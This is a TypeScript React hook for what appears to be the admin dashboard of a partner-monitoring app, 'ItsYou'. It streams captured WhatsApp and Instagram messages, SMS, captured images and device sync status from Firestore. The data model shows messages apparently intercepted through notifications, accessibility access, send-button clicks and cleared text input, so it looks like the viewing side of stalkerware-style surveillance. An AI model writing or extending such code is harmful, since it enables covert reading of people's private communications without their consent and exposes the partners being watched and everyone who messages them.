'use client';

import { useState, useEffect, useCallback } from 'react';
import { db, collection, query, orderBy, onSnapshot, limit, Timestamp } from '../lib/firebase-client';

export interface ItsYouUser {
  id: string;
  email: string;
  name?: string;
  displayName?: string;
  partnerId?: string;
  relationshipStartDate?: Date;
  createdAt?: Date;
  status?: string;
  [key: string]: any;
}

export interface Message {
  id: string;
  app?: string; // Legacy field
  appName?: string; // WhatsApp, Instagram, Messages
  sender?: string;
  recipient?: string;
  content?: string; // Legacy field
  messageText?: string; // Actual field from app
  text?: string; // Alternative field
  timestamp: Date;
  deviceId?: string;
  deviceName?: string;
  deviceModel?: string;
  userId?: string; // Firebase Auth user ID
  read?: boolean;
  isSent?: boolean; // TRUE field for sent messages
  messageType?: 'sent' | 'received'; // TRUE field for message direction
  isGroup?: boolean;
  groupName?: string;
  packageName?: string;
  captureMethod?: 'notification' | 'send_button_click' | 'text_input_cleared' | 'accessibility_filtered' | 'accessibility';
  [key: string]: any;
}

export interface Photo {
  id: string;
  url: string;
  uploadedBy: string;
  createdAt: Date;
  caption?: string;
  [key: string]: any;
}

export interface MusicTrack {
  id: string;
  title: string;
  artist?: string;
  url: string;
  uploadedBy: string;
  createdAt: Date;
  [key: string]: any;
}

export interface SmsMessage {
  id: string;
  sender: string; // Phone number or contact name
  body: string; // Message text
  timestamp: Date; // Firestore timestamp
  type: 'sent' | 'received'; // Message direction
  deviceId?: string;
  [key: string]: any;
}

export interface CapturedImage {
  id: string;
  url: string;
  storagePath: string;
  originalFilename: string;
  appName: string; // WhatsApp, Instagram, etc.
  isSent: boolean;
  messageType: 'sent' | 'received';
  userId: string;
  deviceId: string;
  deviceModel: string;
  timestamp: Date;
  fileSize: number;
  capturedAt: number;
  [key: string]: any;
}

export interface DashboardStats {
  totalUsers: number;
  totalMessages: number;
  totalPhotos: number;
  totalMusic: number;
  todayMessages: number;
  activeDevices: number;
}

export interface StorageStats {
  totalUsed: number; // in bytes
  totalCapacity: number; // in bytes
  usagePercentage: number;
  photosSize: number;
  musicSize: number;
  capturedImagesSize: number;
}

export function useItsYouData(isAuthenticated: boolean) {
  const [users, setUsers] = useState<ItsYouUser[]>([]);
  const [messages, setMessages] = useState<Message[]>([]);
  const [photos, setPhotos] = useState<Photo[]>([]);
  const [music, setMusic] = useState<MusicTrack[]>([]);
  const [sms, setSms] = useState<SmsMessage[]>([]);
  const [capturedImages, setCapturedImages] = useState<CapturedImage[]>([]);
  const [dashboardStats, setDashboardStats] = useState<DashboardStats>({
    totalUsers: 0,
    totalMessages: 0,
    totalPhotos: 0,
    totalMusic: 0,
    todayMessages: 0,
    activeDevices: 0
  });
  const [storageStats, setStorageStats] = useState<StorageStats>({
    totalUsed: 0,
    totalCapacity: 5 * 1024 * 1024 * 1024, // 5GB
    usagePercentage: 0,
    photosSize: 0,
    musicSize: 0,
    capturedImagesSize: 0
  });
  const [loading, setLoading] = useState(true);

  // Load all data when authenticated
  useEffect(() => {
    if (!isAuthenticated) {
      setLoading(false);
      return;
    }

    const unsubscribers: (() => void)[] = [];

    try {
      // Load Users (no limit)
      const usersUnsub = onSnapshot(
        query(collection(db, 'users'), orderBy('createdAt', 'desc')),
        (snapshot) => {
          const usersList: ItsYouUser[] = [];
          snapshot.forEach((doc) => {
            try {
              const data = doc.data();
              usersList.push({
                id: doc.id,
                ...data,
                createdAt: data.createdAt?.toDate() || new Date(),
                relationshipStartDate: data.relationshipStartDate?.toDate()
              } as ItsYouUser);
            } catch (error) {
              console.error('Error processing user document:', error);
            }
          });
          setUsers(usersList);
          setDashboardStats(prev => ({ ...prev, totalUsers: usersList.length }));
          console.log(`Loaded ${usersList.length} users`);
        },
        (error) => console.error('Error loading users:', error)
      );
      unsubscribers.push(usersUnsub);

      // Load Messages (captured notifications from WhatsApp/Instagram)
      // Limit to 100 for dashboard stats - use dedicated hooks for full data
      const messagesUnsub = onSnapshot(
        query(collection(db, 'capturedMessages'), orderBy('timestamp', 'desc'), limit(100)),
        (snapshot) => {
          const messagesList: Message[] = [];
          let todayCount = 0;
          const today = new Date();
          today.setHours(0, 0, 0, 0);

          snapshot.forEach((doc) => {
            try {
              const data = doc.data();
              const timestamp = data.timestamp?.toDate() || new Date();

              // Map Firestore fields to interface
              messagesList.push({
                id: doc.id,
                // App identification
                appName: data.appName || data.app,
                packageName: data.packageName,
                // Message content (try multiple field names)
                messageText: data.messageText,
                content: data.content,
                text: data.text,
                // Sender/Recipient
                sender: data.sender,
                recipient: data.recipient,
                // Message direction (CORRECT fields)
                isSent: data.isSent || false,
                messageType: data.messageType || (data.isSent ? 'sent' : 'received'),
                // Timestamps
                timestamp,
                // Device info
                deviceId: data.deviceId,
                deviceName: data.deviceName,
                deviceModel: data.deviceModel,
                userId: data.userId,
                // Group info
                isGroup: data.isGroup || false,
                groupName: data.groupName,
                // Capture method
                captureMethod: data.captureMethod,
                // Legacy/other
                read: data.read,
                ...data // Keep other fields
              } as Message);

              // Count today's messages
              const messageDate = new Date(timestamp);
              messageDate.setHours(0, 0, 0, 0);
              if (messageDate.getTime() === today.getTime()) {
                todayCount++;
              }
            } catch (error) {
              console.error('Error processing message document:', error);
            }
          });
          setMessages(messagesList);
          setDashboardStats(prev => ({
            ...prev,
            totalMessages: messagesList.length,
            todayMessages: todayCount
          }));
          console.log(`✅ Loaded ${messagesList.length} messages (${todayCount} today)`);
        },
        (error) => console.error('❌ Error loading messages:', error)
      );
      unsubscribers.push(messagesUnsub);

      // Load Photos (limit for performance)
      const photosUnsub = onSnapshot(
        query(collection(db, 'photos'), orderBy('createdAt', 'desc'), limit(100)),
        (snapshot) => {
          const photosList: Photo[] = [];
          snapshot.forEach((doc) => {
            try {
              const data = doc.data();
              photosList.push({
                id: doc.id,
                ...data,
                createdAt: data.createdAt?.toDate() || new Date()
              } as Photo);
            } catch (error) {
              console.error('Error processing photo document:', error);
            }
          });
          setPhotos(photosList);
          setDashboardStats(prev => ({ ...prev, totalPhotos: photosList.length }));
          console.log(`Loaded ${photosList.length} photos`);
        },
        (error) => console.error('Error loading photos:', error)
      );
      unsubscribers.push(photosUnsub);

      // Load Music (limit for performance)
      const musicUnsub = onSnapshot(
        query(collection(db, 'musicLibrary'), orderBy('uploadedAt', 'desc'), limit(50)),
        (snapshot) => {
          const musicList: MusicTrack[] = [];
          snapshot.forEach((doc) => {
            try {
              const data = doc.data();
              musicList.push({
                id: doc.id,
                ...data,
                createdAt: data.uploadedAt?.toDate() || data.createdAt?.toDate() || new Date()
              } as MusicTrack);
            } catch (error) {
              console.error('Error processing music document:', error);
            }
          });
          setMusic(musicList);
          setDashboardStats(prev => ({ ...prev, totalMusic: musicList.length }));
          console.log(`Loaded ${musicList.length} music tracks`);
        },
        (error) => console.error('Error loading music:', error)
      );
      unsubscribers.push(musicUnsub);

      // Load SMS (no limit)
      const smsUnsub = onSnapshot(
        query(collection(db, 'sms'), orderBy('timestamp', 'desc')),
        (snapshot) => {
          const smsList: SmsMessage[] = [];
          snapshot.forEach((doc) => {
            try {
              const data = doc.data();
              smsList.push({
                id: doc.id,
                sender: data.sender || '',
                body: data.body || '',
                timestamp: data.timestamp?.toDate() || new Date(),
                type: data.type || 'received',
                deviceId: data.deviceId,
                ...data
              } as SmsMessage);
            } catch (error) {
              console.error('Error processing SMS document:', error);
            }
          });
          setSms(smsList);
          console.log(`✅ Loaded ${smsList.length} SMS messages`);
        },
        (error) => console.error('❌ Error loading SMS:', error)
      );
      unsubscribers.push(smsUnsub);

      // Load Captured Images (WhatsApp/Instagram images)
      const imagesUnsub = onSnapshot(
        query(collection(db, 'capturedImages'), orderBy('timestamp', 'desc')),
        (snapshot) => {
          const imagesList: CapturedImage[] = [];
          snapshot.forEach((doc) => {
            try {
              const data = doc.data();
              imagesList.push({
                id: doc.id,
                url: data.url || '',
                storagePath: data.storagePath || '',
                originalFilename: data.originalFilename || '',
                appName: data.appName || '',
                isSent: data.isSent || false,
                messageType: data.messageType || 'received',
                userId: data.userId || '',
                deviceId: data.deviceId || '',
                deviceModel: data.deviceModel || '',
                timestamp: data.timestamp?.toDate() || new Date(),
                fileSize: data.fileSize || 0,
                capturedAt: data.capturedAt || 0,
                ...data
              } as CapturedImage);
            } catch (error) {
              console.error('Error processing image document:', error);
            }
          });
          setCapturedImages(imagesList);
          console.log(`✅ Loaded ${imagesList.length} captured images`);
        },
        (error) => console.error('❌ Error loading captured images:', error)
      );
      unsubscribers.push(imagesUnsub);

      // Load Devices Stats
      const devicesUnsub = onSnapshot(
        collection(db, 'devices'),
        (snapshot) => {
          // Count only active devices (synced in last 24 hours)
          const now = new Date();
          const oneDayAgo = new Date(now.getTime() - 24 * 60 * 60 * 1000);

          let activeCount = 0;
          snapshot.forEach((doc) => {
            try {
              const data = doc.data();
              const lastSync = data.lastSyncTime?.toDate();
              if (lastSync && lastSync > oneDayAgo) {
                activeCount++;
              }
            } catch (error) {
              console.error('Error processing device document:', error);
            }
          });

          setDashboardStats(prev => ({ ...prev, activeDevices: activeCount }));
          console.log(`✅ Loaded ${snapshot.size} total devices (${activeCount} active)`);
        },
        (error) => console.error('❌ Error loading devices:', error)
      );
      unsubscribers.push(devicesUnsub);

      setLoading(false);
    } catch (error) {
      console.error('Error setting up data listeners:', error);
      setLoading(false);
    }

    // Cleanup function
    return () => {
      unsubscribers.forEach(unsub => unsub());
    };
  }, [isAuthenticated]);

  // Calculate storage stats whenever photos, music, or capturedImages change
  useEffect(() => {
    // Estimate file sizes (we don't store actual sizes in Firestore)
    const estimatedPhotoSize = 2 * 1024 * 1024; // 2MB per photo
    const estimatedMusicSize = 5 * 1024 * 1024; // 5MB per music file
    const estimatedCapturedImageSize = 3 * 1024 * 1024; // 3MB per captured image (higher quality)

    const photosSize = photos.length * estimatedPhotoSize;
    const musicSize = music.length * estimatedMusicSize;
    const capturedImagesSize = capturedImages.length * estimatedCapturedImageSize;
    const totalUsed = photosSize + musicSize + capturedImagesSize;
    const totalCapacity = 5 * 1024 * 1024 * 1024; // 5GB
    const usagePercentage = Math.min(Math.round((totalUsed / totalCapacity) * 100), 100);

    setStorageStats({
      totalUsed,
      totalCapacity,
      usagePercentage,
      photosSize,
      musicSize,
      capturedImagesSize
    });
  }, [photos, music, capturedImages]);

  const refreshData = useCallback(() => {
    console.log('Refreshing all data...');
    // Data will automatically refresh through onSnapshot listeners
  }, []);

  return {
    users,
    messages,
    photos,
    music,
    sms,
    capturedImages,
    dashboardStats,
    storageStats,
    loading,
    refreshData
  };
}
